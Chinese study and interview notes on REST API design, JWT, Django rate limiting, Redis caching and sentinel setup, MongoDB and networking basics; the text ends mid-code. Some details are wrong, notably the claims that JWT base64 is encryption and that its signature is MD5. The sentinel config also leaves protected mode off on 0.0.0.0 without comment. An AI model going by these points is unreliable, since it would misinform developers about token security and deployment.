### 怎么写接口

​	参照某种规则(规范)书写url链接，同时根据规则制定请求方式，请求数据与响应结果	

### 接口文档（yapi)

​	提供给前后台开发人员与测试人员查看

### restful 接口规范

​	webapi接口规范：restful 

## Restful 接口规范

说：一般采用安全协议https,然后采用api形式，标识是如何操作数据的，操作的数据称之为资源，采用版本控制和数据的复数形式，不同的请求方式决定资源的操作方式，具体的错误要通过状态码显示。

get 索取所有

post 提交

delete 后端操作，不做任何返回，返回为空（我们使用的时候会进行给状态和状态信息）

数据的安全保障

接口特征表现

多数据版本共存

数据即是资源

资源操作由请求方式决定

响应状态码

响应结果响应数据要有状态码、状态信息以及数据本身需要url请求的资源需要访问资源的请求链接

### 简介



2000年Roy Fielding博士在其博士论文中提出REST（Representational State Transfer）风格的软件架构模式后，REST就基本上迅速取代了复杂而笨重的SOAP，成为Web API的标准了。

RESTful作为目前最流行的 API 设计规范，一定有着它独有的魅力：强大、简易、易上手。

### 什么是restful api，谈谈你的理解?

上来先给面试官扔出一手Django的restgramework源码(这一块知识课下一定要自己看着源码走三遍做到烂熟于心，看着面试官的眼睛快速自信的说出。这一手源码扔出来之后，面试已经成功一半)
REST:Representational State Transfer的缩写，翻译：“具象状态传输”。一般解释为“表现层状态转换”。
REST是设计风格而不是标准。是指客户端和服务器的交互形式。我们需要关注的重点是如何设计REST风格的网络接口。
REST的特点：
1.具象的。一般指表现层，要表现的对象就是资源。比如，客户端访问服务器，获取的数据就是资源。比如文字、图片、音视频等。
2.表现：资源的表现形式。txt格式、html格式、json格式、jpg格式等。浏览器通过URL确定资源的位置，但是需要在HTTP请求头中，用AcceptContent-Type字段指定，这两个字段是对资源表现的描述。
3.状态转换：客户端和服务器交互的过程。在这个过程中，一定会有数据和状态的转化，这种转化叫做状态转换。其中，GET表示获取资源，POST表示新建资源，PUT表示更新资源，DELETE表示删除资源。HTTP协议中最常用的就是这四种操作方式。
RESTful架构：
1.每个URL代表一种资源；
2.客户端和服务器之间，传递这种资源的某种表现层；
3.客户端通过四个http动词，对服务器资源进行操作，实现表现层状态转换。

### URL设计

与django相比的话，不会出现csrf问题

接口规范：

```
https/api/v1/books/get、post/？limit=3/http_status/{status,msg,results}/data:https://delete
成功不做数据返回
```



urls.py

```
from django.conf.urls import url, include
from django.contrib import admin

from api import views
urlpatterns = [
    url(r'^admin/', admin.site.urls),
    url(r'^test/', views.Test.as_view()),
    # 路由分发
    url(r'^api/', include('api.urls')),
]
```

app内的urls.py

```
from django.conf.urls import url

from . import views

urlpatterns = [
    url(r'^books/$', views.Book.as_view()),
    url(r'^books/(?P<pk>\d+)/$', views.Book.as_view()),
]

```



### 数据的安全保障

* url链接一般都采用https协议进行传输

  注：采用https协议，可以提高数据交互过程中的安全性

### 接口特征表现

* 用api关键字标识接口url：

  * [https://api.baidu.com](https://api.baidu.com/)
  * https://www.baidu.com/api

  注：看到api字眼，就代表该请求url链接是完成前后台数据交互的

### 多数据版本共存

* 在url链接中标识数据版本

  * https://api.baidu.com/v1
  * https://api.baidu.com/v2

  注：url链接中的v1、v2就是不同数据版本的体现（只有在一种数据资源有多版本情况下）

### 数据即是资源

* 接口一般都是完成前后台数据的交互，交互的数据我们称之为资源

  * https://api.baidu.com/users
  * https://api.baidu.com/books
  * https://api.baidu.com/book

  注：一般提倡用资源的复数形式，在url链接中奖励不要出现操作资源的动词，错误示范：https://api.baidu.com/delete-user

* 特殊的接口可以出现动词，因为这些接口一般没有一个明确的资源，或是动词就是接口的核心含义

  * https://api.baidu.com/place/search
  * https://api.baidu.com/login

### 资源操作由请求方式决定

* 操作资源一般都会涉及到增删改查，我们提供请求方式来标识增删改查动作
  * https://api.baidu.com/books - get请求：获取所有书
  * https://api.baidu.com/books/1 - get请求：获取主键为1的书
  * https://api.baidu.com/books - post请求：新增一本书书
  * https://api.baidu.com/books/1 - put请求：整体修改主键为1的书
  * https://api.baidu.com/books/1 - patch请求：局部修改主键为1的书
  * https://api.baidu.com/books/1 - delete请求：删除主键为1的书

### 响应状态码

#### 正常响应

* 响应状态码2xx
  * 200：常规请求
  * 201：创建成功

#### 重定向响应

* 响应状态码3xx
  * 301：永久重定向
  * 302：暂时重定向

#### 客户端异常

* 响应状态码4xx
  * 403：请求无权限
  * 404：请求路径不存在
  * 405：请求方法不存在

#### 服务器异常

* 响应状态码5xx
  * 500：服务器异常

### 响应结果

响应数据要有状态码、状态信息以及数据本身需要url请求的资源需要访问资源的请求链接

```
{
    "status": 0,
    "msg": "ok",
    "results":[
        {
            "name":"肯德基(罗餐厅)",
            "img": "https://image.baidu.com/kfc/001.png"
        }
        ...
        ]
}
```

## JWT的组成

### 为什么要才有jwt认证(优点)

1) 后台不需要存储token，只需要存储签发与校验token的算法，效率远远大于后台存储和取出token完成校验
2) jwt算法认证，更适合服务器集群部署

服务器压力小，集群部署更加完善。

```
"""
全称：json web token
解释：加密字符串的原始数据是json，后台产生，通过web传输给前台存储
格式：三段式 - 头.载荷.签名 - 头和载荷才有的是base64可逆加密，签名才有md5不可逆加密
内容：
	头(基础信息,也可以为空)：加密方式、公司信息、项目组信息、...
	载荷(核心信息)：用户信息、过期时间、...
	签名(安全保障)：头加密结果+载荷加密结果+服务器秘钥 的md5加密结果
	
	
认证规则：
	后台一定要保障 服务器秘钥 的安全性(它是jwt的唯一安全保障)
	后台签发token -> 前台存储 -> 发送需要认证的请求带着token -> 后台校验得到合法的用户
	
	
为什么要才有jwt认证：
	1) 后台不需要存储token，只需要存储签发与校验token的算法，效率远远大于后台存储和取出token完成校验
	2) jwt算法认证，更适合服务器集群部署
"""
```



JWT含有三个部分：

* **头部（header）**
* **载荷（payload）**
* **签证（signature）**

**头部（header）**
 头部一般有两部分信息：`类型`、`加密的算法`（通常使用HMAC SHA256）
 头部一般使用base64加密：`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`
 解密后：

```json
{
    "typ":"JWT",
    "alg":"HS256"
}
```

**载荷（payload）**
 该部分一般存放一些有效的信息。JWT的标准定义包含五个字段：

*  **iss**：该JWT的签发者
*  **sub**：该JWT所面向的用户
*  **aud**：接收该JWT的一方
*  **exp（expires）**：什么时候过期，这里是一个Unit的时间戳
*  **iat（issued at**）：在什么时候签发的

**签证（signature）**
 JWT最后一个部分。该部分是使用了HS256加密后的数据；包含三个部分：

*  **heade**r(base64后的）
*  **payload**（base64后的）
*  **secret** 私钥

`secret`是保存在`服务器端`的，JWT的签发生成也是在服务器端的，`secret`就是用来进行JWT的`签发`和JWT的`验证`，所以，它就是你服务端的`秘钥`，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端可以自我签发JWT了。

```python
# 签发token，并将user和token存放到序列化对象中
        payload = jwt_payload_handler(user)
        """
        payload = {
        'user_id': user.pk,
        'username': username,
        'exp': datetime.utcnow() + api_settings.JWT_EXPIRATION_DELTA
    }
        """
        token = jwt_encode_handler(payload)
        """
        key = api_settings.JWT_PRIVATE_KEY or jwt_get_secret_key(payload)
        return jwt.encode(
            payload,
            key,
            api_settings.JWT_ALGORITHM
        ).decode('utf-8')
        """
```



### JWT特点

*  **紧凑**：意味着这个字符串很小，甚至可以放在URL参数，POST Parameter中以Http Header的方式传输。
*  **自包含**：传输的字符串包含很多信息，别人拿到以后就不需要多次访问数据库获取信息，而且通过其中的信息就可以知道加密类型和方式（当然解密需要公钥和密钥）。

### 如何使用JWT？

在身份鉴定的实现中，传统的方法是在服务端存储一个 `session`，给客户端返回一个 `cookie`，而使用JWT之后，当用户使用它的认证信息登录系统之后，会返回给用户一个`JWT`， 用户只需要本地保存该 `token`（通常使用localStorage，也可以使用cookie）即可。

当用户希望访问一个受保护的路由或者资源的时候，通常应该在 `Authorization` 头部使用 `Bearer` 模式添加JWT，其内容格式：

```xml
Authorization: Bearer <token>
```

因为用户的状态在`服务端内容中是不存储`的，所以这是一种`无状态`的认证机制。服务端的保护路由将会检查请求头 `Authorization` 中的JWT信息，如果合法，则允许用户的行为。由于JWT是 `自包含`的，因此，减少了需要查询数据库的需要。

JWT的这些特征使得我们可以完全依赖无状态的特性提供数据API服务。因为JWT并不使用Cookie的，所以你可以在任何域名提供你的API服务而不需要担心跨域资源共享问题（CORS）

下面的序列图展示了该过程：



![img](https:////upload-images.jianshu.io/upload_images/11464886-9fd1cd00741d5d8d.png?imageMogr2/auto-orient/strip|imageView2/2/w/800/format/webp)

image

中文流程介绍：

1. 用户使用账号和密码发出POST登录请求；
2. 服务器使用私钥创建一个JWT；
3. 服务器返回这个JWT给浏览器；
4. 浏览器将该JWT串放在请求头中向服务器发送请求；
5. 服务器验证该JWT；
6. 返回响应的资源给浏览器。

说了这么多JWT到底如何应用到我们的项目中，下面我们就使用SpringBoot 结合 JWT完成用户的登录验证。

### 应用流程

* 初次登录生成JWT流程图

  

  ![img](https:////upload-images.jianshu.io/upload_images/11464886-e074e8f5891b6f3f.png?imageMogr2/auto-orient/strip|imageView2/2/w/729/format/webp)

  image

* 用户访问资源流程图

  

  ![img](https:////upload-images.jianshu.io/upload_images/11464886-83d07cc27a3f7237.png?imageMogr2/auto-orient/strip|imageView2/2/w/745/format/webp)

# 限制访问频率

**定义限制访问频率的中间件**

common/middleware.py

```

import time

from django.utils.deprecation import MiddlewareMixin

MAX_REQUEST_PER_SECOND=2 #每秒访问次数

class RequestBlockingMiddleware(MiddlewareMixin):

    def process_request(self,request):
        now=time.time()
        request_queue = request.session.get('request_queue',[])
        if len(request_queue) < MAX_REQUEST_PER_SECOND:
            request_queue.append(now)
            request.session['request_queue']=request_queue
        else:
            time0=request_queue[0]
            if (now-time0)<1:
                time.sleep(5)

            request_queue.append(time.time())
            request.session['request_queue']=request_queue[1:]

```

**二、将中间件加入配置文件**

setting.py

```
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'common.middleware.RequestBlockingMiddleware', #在sessions之后，auth之前
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]
```

对使用 rest_framework 框架的项目来说，可以使用框架的设置来对api的访问频率进行限制

```python
REST_FRAMEWORK = {
'DEFAULT_PARSER_CLASSES': (
'rest_framework.parsers.JSONParser',
'rest_framework.parsers.FormParser',
'rest_framework.parsers.MultiPartParser',
),

'DEFAULT_AUTHENTICATION_CLASSES': (
# 'lecare.core.rest_auth.CrossSiteSessionAuthentication',
),

'DEFAULT_PERMISSION_CLASSES': [
# 'rest_framework.permissions.IsAuthenticated',
'rest_framework.permissions.AllowAny',
],

'PAGE_SIZE': 20,
'UNICODE_JSON': False,
# 'COERCE_DECIMAL_TO_STRING': False,
# 'EXCEPTION_HANDLER': 'lecare.core.custom_exception_handler.custom_exception_handler',
'JWT_EXPIRATION_DELTA': datetime.timedelta(hours = 2),
'JWT_REFRESH_EXPIRATION_DELTA': datetime.timedelta(days = 360),
'JWT_ALLOW_REFRESH': False,
'JWT_AUTH_HEADER_PREFIX': 'JWT',
'JWT_PAYLOAD_HANDLER': 'consumer.jwt_conf.jwt_payload_handler',
'JWT_RESPONSE_PAYLOAD_HANDLER': 'consumer.jwt_conf.jwt_response_payload_handler',
'JWT_GET_USER_SECRET_KEY': 'consumer.jwt_conf.jwt_get_secret_key',
# 'DEFAULT_THROTTLE_CLASSES': (
# # 开启匿名用户接口请求频率限制
# 'rest_framework.throttling.AnonRateThrottle',
# # 开启授权用户接口请求频率限制
# 'rest_framework.throttling.UserRateThrottle'
# ),
'DEFAULT_THROTTLE_RATES': {
 # 频率限制有second, minute, hour, day
 # 匿名用户请求频率
 'anon': '30/second',
 # 授权用户请求频率
 'user': '30/second'
# }
}
```





# Redis

## Redis，缓存穿透与缓存雪崩，解决办法（解决办法没答布隆过滤器）

```python
缓存穿透：缓存与数据库中都没有，恶意访问，频繁的查数据库，压力大
	解决办法：查询一次，如果没有，缓存中增加空值
    	采用布隆过滤器（将所有可能存在的数据哈希到一个足够大的bitmap中）

缓存雪崩：同一时间，大量键过期，同时访问数据库，压力大
	解决办法：设置过期时间为随机
    
缓存击穿：前台高并发访问一个已经在缓存中恰好过期的数据，全部打到后台数据库
	解决办法：互斥锁，Redis的SETNX功能，数据没有，返回一个设定值，再去查数据库
    	热点数据设置永不过期
```

## Redis的内存清理机制

```python
定时随机清除
惰性清除
配置文件里的清除（常用清理访问次数最少的）
```



string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hash（哈希类型）

## 简介

redis是一个key-value存储系统。和Memcached（也是一个数据库）类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步

## 使用Redis有哪些好处？

(1) 速度快，因为数据存在内存中，类似于HashMap，HashMap的优势就是查找和操作的时间复杂度都是O(1)

(2) 支持丰富数据类型，支持string，list，set，sorted set，hash

(3) 支持事务，操作都是原子性，所谓的原子性就是对数据的更改要么全部执行，要么全部不执行

(4) 丰富的特性：可用于缓存，消息，按key设置过期时间，过期后将会自动删除

## redis相比memcached有哪些优势？

(1) memcached所有的值均是简单的字符串，redis作为其替代者，支持更为丰富的数据类型

(2) redis的速度比memcached快很多

(3) redis可以持久化其数据



## redis常见性能问题和解决方案：

(1) Master最好不要做任何持久化工作，如RDB内存快照和AOF日志文件

(2) 如果数据比较重要，某个Slave开启AOF备份数据，策略设置为每秒同步一次

(3) 为了主从复制的速度和连接的稳定性，Master和Slave最好在同一个局域网内

(4) 尽量避免在压力很大的主库上增加从库

(5) 主从复制不要用图状结构，用单向链表结构更为稳定，即：Master <- Slave1 <- Slave2 <- Slave3...

这样的结构方便解决单点故障问题，实现Slave对Master的替换。如果Master挂了，可以立刻启用Slave1做Master，其他不变。

## MySQL里有2000w数据，redis中只存20w的数据，如何保证redis中的数据都是热点数据

 相关知识：redis 内存数据集大小上升到一定大小的时候，就会施行数据淘汰策略。redis 提供 6种数据淘汰策略：

voltile-lru：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰

volatile-ttl：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰

volatile-random：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰

allkeys-lru：从数据集（server.db[i].dict）中挑选最近最少使用的数据淘汰

allkeys-random：从数据集（server.db[i].dict）中任意选择数据淘汰

no-enviction（驱逐）：禁止驱逐数据

## Memcache与Redis的区别都有哪些？

1)、存储方式

Memecache把数据全部存在内存之中，断电后会挂掉，数据不能超过内存大小。

Redis有部份存在硬盘上，这样能保证数据的持久性。

2)、数据支持类型

Memcache对数据类型支持相对简单。

Redis有复杂的数据类型。

3），value大小

redis最大可以达到1GB，而memcache只有1MB

## Redis 常见的性能问题都有哪些？如何解决？

 

1).Master写内存快照，save命令调度rdbSave函数，会阻塞主线程的工作，当快照比较大时对性能影响是非常大的，会间断性暂停服务，所以Master最好不要写内存快照。

2).Master AOF持久化，如果不重写AOF文件，这个持久化方式对性能的影响是最小的，但是AOF文件会不断增大，AOF文件过大会影响Master重启的恢复速度。Master最好不要做任何持久化工作，包括内存快照和AOF日志文件，特别是不要启用内存快照做持久化,如果数据比较关键，某个Slave开启AOF备份数据，策略为每秒同步一次。

3).Master调用BGREWRITEAOF重写AOF文件，AOF在重写的时候会占大量的CPU和内存资源，导致服务load过高，出现短暂服务暂停现象。

4). Redis主从复制的性能问题，为了主从复制的速度和连接的稳定性，Slave和Master最好在同一个局域网内



## redis 最适合的场景

Redis最适合所有数据in-momory的场景，虽然Redis也提供持久化功能，但实际更多的是一个disk-backed的功能，跟传统意义上的持久化有比较大的差别，那么可能大家就会有疑问，似乎Redis更像一个加强版的Memcached，那么何时使用Memcached,何时使用Redis呢?

如果简单地比较Redis与Memcached的区别，大多数都会得到以下观点：

 1 、Redis不仅仅支持简单的k/v类型的数据，同时还提供list，set，zset，hash等数据结构的存储。
 2 、Redis支持数据的备份，即master-slave模式的数据备份。
 3 、Redis支持数据的持久化，可以将内存中的数据保持在磁盘中，重启的时候可以再次加载进行使用。

（1）、会话缓存（Session Cache）

最常用的一种使用Redis的情景是会话缓存（session cache）。用Redis缓存会话比其他存储（如Memcached）的优势在于：Redis提供持久化。当维护一个不是严格要求一致性的缓存时，如果用户的购物车信息全部丢失，大部分人都会不高兴的，现在，他们还会这样吗？

幸运的是，随着 Redis 这些年的改进，很容易找到怎么恰当的使用Redis来缓存会话的文档。甚至广为人知的商业平台Magento也提供Redis的插件。

（2）、全页缓存（FPC）

除基本的会话token之外，Redis还提供很简便的FPC平台。回到一致性问题，即使重启了Redis实例，因为有磁盘的持久化，用户也不会看到页面加载速度的下降，这是一个极大改进，类似PHP本地FPC。

再次以Magento为例，Magento提供一个插件来使用Redis作为全页缓存后端。

此外，对WordPress的用户来说，Pantheon有一个非常好的插件  wp-redis，这个插件能帮助你以最快速度加载你曾浏览过的页面。

（3）、队列

Reids在内存存储引擎领域的一大优点是提供 list 和 set 操作，这使得Redis能作为一个很好的消息队列平台来使用。Redis作为队列使用的操作，就类似于本地程序语言（如Python）对 list 的 push/pop 操作。

如果你快速的在Google中搜索“Redis queues”，你马上就能找到大量的开源项目，这些项目的目的就是利用Redis创建非常好的后端工具，以满足各种队列需求。例如，Celery有一个后台就是使用Redis作为broker，你可以从这里去查看。

（4），排行榜/计数器

Redis在内存中对数字进行递增或递减的操作实现的非常好。集合（Set）和有序集合（Sorted Set）也使得我们在执行这些操作的时候变的非常简单，Redis只是正好提供了这两种数据结构。所以，我们要从排序集合中获取到排名最靠前的10个用户–我们称之为“user_scores”，我们只需要像下面一样执行即可：

当然，这是假定你是根据你用户的分数做递增的排序。如果你想返回用户及用户的分数，你需要这样执行：

ZRANGE user_scores 0 10 WITHSCORES

Agora Games就是一个很好的例子，用Ruby实现的，它的排行榜就是使用Redis来存储数据的，你可以在这里看到。

（5）、发布/订阅

最后（但肯定不是最不重要的）是Redis的发布/订阅功能。发布/订阅的使用场景确实非常多。我已看见人们在社交网络连接中使用，还可作为基于发布/订阅的脚本触发器，甚至用Redis的发布/订阅功能来建立聊天系统！（不，这是真的，你可以去核实）。

Redis提供的所有特性中，我感觉这个是喜欢的人最少的一个，虽然它为用户提供如果此多功能。

## **支持的数据类型（5大数据类型）**

![img](https://img2018.cnblogs.com/blog/1350514/201810/1350514-20181022174851255-1938821619.png)



```
redis={
        k1:'123',      字符串
        k2:[1,2,3,4],   列表/数组
        k3:{1,2,3,4}     集合
        k4:{name:lqz,age:12}  字典/哈希表
        k5:{('lqz',18),('egon',33)}  有序集合
}
```

**特点：**

```
可以持久化
单线程，单进程
```

```
import redis

pool = redis.ConnectionPool(host='127.0.0.1', port=6379)
r = redis.Redis(connection_pool=pool)
r.set('foo', 'Bar')
print(r.get('foo'))
```





## 4 发布订阅，观察者模式

###  发布订阅

### 3.1 角色

**发布者/订阅者/频道**

发布者发布了消息，所有的订阅者都可以收到，就是生产者消费者模型（后订阅了，无法获取历史消息）

### 3.2 模型

![image-20191225163659941](https://tva1.sinaimg.cn/large/006tNbRwgy1ga923qyr2uj31xp0u0jwt.jpg)

### 

## 5 GEO 地理位置信息

附近的人，查找附近的商铺，计算两个点的直线距离

## 6 持久化方案

###  RDB和AOF的选择

### 4.1 rdb和aof的比较

| 命令       | rdb    | aof                           |
| ---------- | ------ | ----------------------------- |
| 启动优先级 | 低     | 高(挂掉重启，会加载aof的数据) |
| 体积       | 小     | 大                            |
| 恢复速度   | 快     | 慢                            |
| 数据安全性 | 丢数据 | 根据策略决定                  |
| 轻重       | 重     | 轻                            |

### 4.2  rdb最佳策略

rdb关掉，主从操作时

集中管理：按天，按小时备份数据

主从配置，从节点打开

### 4.3 aof最佳策略

开：缓存和存储，大部分情况都打开，

aof重写集中管理

everysec：通过每秒刷新的策略

### 4.4 最佳策略

小分片：每个redis的最大内存为4g

缓存或存储：根据特性，使用不通策略

时时监控硬盘，内存，负载网络等

有足够内存



## 7 主从复制

一台机器上可以启动多个redis服务，监听的端口不同

./src/redis-cli -p 6378   连接6378

### 通过命令来做

slaveof 127.0.0.1 6379

### 通过配置文件（写到配置文件）

slaveof ip port #配置从节点ip和端口
slave-read-only yes #从节点只读，因为可读可写，数据会乱



## 8 哨兵高可用

### 一 主从复制高可用

```python
#主从复制存在的问题：
#1 主从复制，主节点发生故障，需要做故障转移，可以手动转移：让其中一个slave变成master
#2 主从复制，只能主写数据，所以写能力和存储能力有限
```

### 二 架构说明

可以做故障判断，故障转移，通知客户端（其实是一个进程），客户端直接连接sentinel的地址

<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gadzuhodicj30oe0dc0y9.jpg" alt="image-20191229230823911" style="zoom:50%;" />

1 多个sentinel发现并确认master有问题

2 选举触一个sentinel作为领导

3 选取一个slave作为新的master

4 通知其余slave成为新的master的slave

5 通知客户端主从变化

6 等待老的master复活成为新master的slave

### 1 搭一个一主两从

```python
#创建三个配置文件：
#第一个是主配置文件
daemonize yes
pidfile /var/run/redis.pid
port 6379
dir "/opt/soft/redis/data"
logfile “6379.log”

#第二个是从配置文件
daemonize yes
pidfile /var/run/redis2.pid
port 6378
dir "/opt/soft/redis/data2"
logfile “6378.log”
slaveof 127.0.0.1 6379
slave-read-only yes
#第三个是从配置文件
daemonize yes
pidfile /var/run/redis3.pid
port 6377
dir "/opt/soft/redis/data3"
logfile “6377.log”
slaveof 127.0.0.1 6379
slave-read-only yes


#把三个redis服务都启动起来
./src/redis-server redis_6379.conf
./src/redis-server redis_6378.conf
./src/redis-server redis_6377.conf
```

2 搭建哨兵

```python
# sentinel.conf这个文件
# 把哨兵也当成一个redis服务器
创建三个配置文件分别叫sentinel_26379.conf sentinel_26378.conf  sentinel_26377.conf

#内容如下(需要修改端口，文件地址日志文件名字)
port 26379
daemonize yes
dir ./data3
protected-mode no
bind 0.0.0.0
logfile "redis_sentinel3.log"
sentinel monitor mymaster 127.0.0.1 6379 2
sentinel down-after-milliseconds mymaster 30000
sentinel parallel-syncs mymaster 1
sentinel failover-timeout mymaster 180000


#启动三个哨兵
./src/redis-sentinel sentinel_26379.conf
./src/redis-sentinel sentinel_26378.conf
./src/redis-sentinel sentinel_26377.conf


# 主动停掉主redis 6379，哨兵会自动选择一个从库作为主库
#等待原来的主库启动，该主库会变成从库




```

# Mongodb

1、在概念上，MongoDB的文档与Javascript的对象相近，因而可以认为它类似于JSON。JSON（http://www.json.org）是一种简单的数据表示方式：其规范仅用一段文字就能描述清楚（其官网证明了这点），且仅包含六种数据类型。

2、这样有很多好处：易于理解、易于解析、易于记忆。然而从另一方面说，因为只有null、布尔、数字、字符串、数字和对象这几种数据类型，所以JSON的表达能力有一定的局限。

3、虽然JSON具备的这些类型已经具有很强的表现力，但绝大数应用（尤其是在于数据库打交道时）都还需要其他一些重要的类型。例如，JSON没有日期类型，这使得原本容易日期处理变得烦人。另外，JSON只有一种数字类型，无法区分浮点数和整数，更别区分32位和64位了。再者JSON无法表示其他一些通用类型，如正则表达式或函数。

4、MongoDB在保留了JSON基本键/值对特性的基础上，添加了其他一些数据类型。在不同的编程语言下，这些类型的确切表示有些许差异。下面说明了MongoDB支持的其他通用类型，以及如何正在文档中使用它们

# 网络编程

## python基础之socket编程

### 一、客户端和服务器架构

c/s架构和b/s架构

1. c:client(客户端) 	s:server(服务器端)	比如电脑上安装的qq,微信
2. b:browser(浏览器)     s:server(服务器端)  比如，京东，天猫网页（这里不上app）
3. s(服务器)端：有固定的ip,稳定一直在运行，支持并发（多线程）
4. b/s架构也是c/s架构的一种
5. c/s架构分为：硬件c/s架构（打印机）和软件c/s架构



## TCP/IP协议

TCP/IP（Transmission Control Protocol/Internet Protocol，传输控制协议/网际协议）是指能够在多个不同网络间实现信息传输的协议簇。TCP/IP协议不仅仅指的是[TCP](https://baike.baidu.com/item/TCP/33012) 和[IP](https://baike.baidu.com/item/IP/224599)两个协议，而是指一个由[FTP](https://baike.baidu.com/item/FTP/13839)、[SMTP](https://baike.baidu.com/item/SMTP/175887)、TCP、[UDP](https://baike.baidu.com/item/UDP/571511)、IP等协议构成的协议簇， 只是因为在TCP/IP协议中TCP协议和IP协议最具代表性，所以被称为TCP/IP协议。

* TCP（transport control protocol，传输控制协议）是面向连接的，面向流的，提供高可靠性服务。收发两端（客户端和服务器端）都要有一一成对的socket，因此，发送端为了将多个发往接收端的包，更有效的发到对方，使用了优化方法（Nagle算法），将多次间隔较小且数据量小的数据，合并成一个大的数据块，然后进行封包。这样，接收端，就难于分辨出来了，必须提供科学的拆包机制。 即面向流的通信是无消息保护边界的。
* UDP（user datagram protocol，用户数据报协议）是无连接的，面向消息的，提供高效率服务。不会使用块的合并优化算法，, 由于UDP支持的是一对多的模式，所以接收端的skbuff(套接字缓冲区）采用了链式结构来记录每一个到达的UDP包，在每个UDP包中就有了消息头（消息来源地址，端口等信息），这样，对于接收端来说，就容易进行区分处理了。 即面向消息的通信是有消息保护边界的。
* TCP是基于数据流的，于是收发的消息不能为空，这就需要在客户端和服务端都添加空消息的处理机制，防止程序卡住，而udp是基于数据报的，即便是你输入的是空内容（直接回车），那也不是空消息，udp协议会帮你封装上消息头，实验略



## http协议

http是超文本传输协议

1. ### http有四大特性：

   * 基于TCP/IP之上作用于应用层。
   * 基于请求响应
   * 无状态: 不保存状态，就是不保存记录，可以多次访问，一直访问，(cookie,session,token)
   * 无连接：请求一次响应一次，然后断开(如果使用长连接，使用websocket(HTTP协议的大补丁))

2. ### 数据格式

   1. 数据格式之请求格式
      * 请求首行(请求方式，协议版本。。。)
      * 请求头(一大堆k:v键值对)
      * \r\n(空行，或者说换行)
      * 请求体:向服务器发送post请求的时候，请求体才会有数据，如果是get请求是没有请求体的。
   2. 数据格式之响应格式
      * 响应首行
      * 响应头
      * \r\n
      * 响应体

3. ### 请求方式

   * get请求：向一方(服务器)要数据。
   * post请求：向一方(服务器)提交数据（eg>用户登陆）

4. ### 响应状态码

   * 1xx	服务端已经接收到 你发送的数据，正在处理，你可以继续提交数据，informational(信息状态码)，接收的请求正在处理。
   * 2xx	请求成功。sunccess(成功状态码)请求正常处理完毕
   * 3xx	重定向，redirection(重定向状态码)，需要进行附加操作完成请求
   * 4xx	请求错误(404:请求资源不存在，403:拒绝访问),client Error(客户端错误状态码)，服务器无法处理请求
   * 5xx	服务器内部错误(500) server error(服务器错误状态码)，服务器处理请求出错。

## 1.1 学习网络编程的目的

学习网络编程的目的就是为了写一个cs架构的软件

1. c(客户端)----------------网络-----------------s(服务器端)
2. 就是完成c/s架构的开发



### 二、osi七层协议

1. 网络：网络连接介质+网络协议（osi七层）

2. 网络协议：osi七层协议：应用层，表示层，会话层，传输层，网络层，数据链路层，物理层

   ![](https://img2018.cnblogs.com/blog/1739658/201909/1739658-20190905170159356-24414458.png)

3. 五层协议：应用层，传输层，网络层，数据层，物理层

   ![](https://img2018.cnblogs.com/blog/1739658/201909/1739658-20190905170151358-445093996.png)

4. 四层协议![](https://img2018.cnblogs.com/blog/1739658/201909/1739658-20190905170127383-109039136.png)



## 2.1五层协议分析

1. 物理层：010101这种电信号

2. 数据链路层：

   1. 把物理层的电信号分组，每一组叫一个数据报/数据帧。每一个数据帧分成：报头head和数据data俩部分
      1. 每一个数据报，都有报头和数据部分。
         * 报头：固定的18个字节 ，6个字节是发送者的地址，6个字节是接收者的地址，6个字节是数据类型
      2. mac地址：发送者、接收者的地址，就是mac地址
         * 每块网卡都有一个唯一的mac地址，12位16进制数表示（前6位是厂商编号，后六位是流水编号）
      3. 广播:同一个局域网里进行通信，容易产生广播风暴

3. 网络层

   1. ip:ipv4:32位2进制表示，点分十进制表示，从0.0.0.0到255.255.255.255，范围是有限的，不能表示出所有的网路设备，所以出现了ipv6

   2. 子网掩码：通过子网掩码和ip判断俩个ip是否处于同一个网段，通过ip地址和子网掩码做按位与运算

      ```python
      ip地址：  172.16.10.1：      10101100.00010000.00001010.000000001
      子网掩码：255.255.255.0:     11111111.11111111.11111111.000000000
      按位与运算：172.16.10.0      10101100.00010000.00001010.000000000
      172.16.10.0/24包含了ip地址和子网掩码
      ```

   3. ip跟mac有转换的关系

      1. 主机176.16.10.10.10/24访问172.16.10.11/24

      2. ARP协议：广播的方式发售那个数据包，获取目标主机的mac地址

      3. mac地址：查找学习mac地址和ip地址的映射表

         * ```
           第一次接收到就会在ip/mac映射表中添加一条数据{’172.16.10.11“：ddsadfgegsdgsdg}
           ```

   4. 任何一种协议都是由头部和内容的

4. 传输层

   tcp协议：

   1. 三次握手，四次挥手（重点），连接如何建立，发送数据如何保证可靠，断开如何断开，在建立连接过程中由状态。

      ![](https://img2018.cnblogs.com/blog/1739658/201909/1739658-20190905170209371-304595843.png)

   2. 服务的如果看到大量的syn_rcvd状态，请求同步收到状态

   3. dos和ddos攻击：拒绝服务攻击，分布式的拒绝服务攻击

   4. 端口号：端口号的范围0~65535,0-1023位系统占用端口

   udp协议：

   1. 发送，不需要响应，所以数据不可靠（比如看视频的 时候会花屏）
   2. 端口
      * 通过ip和子网掩码唯一确定一台设备
      * 通过ip和子网掩码维一以及端口号唯一确定一个软件。

5. 应用层



### 四、简单的通信

```python
#服务端
#导入一个socket模块
import socket

#想象成买手机打电话:socket.SOCK_STREAM 表示建立tcp连接 ,udp连接socket.SOCK_DGRAM
#买了个手机
soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
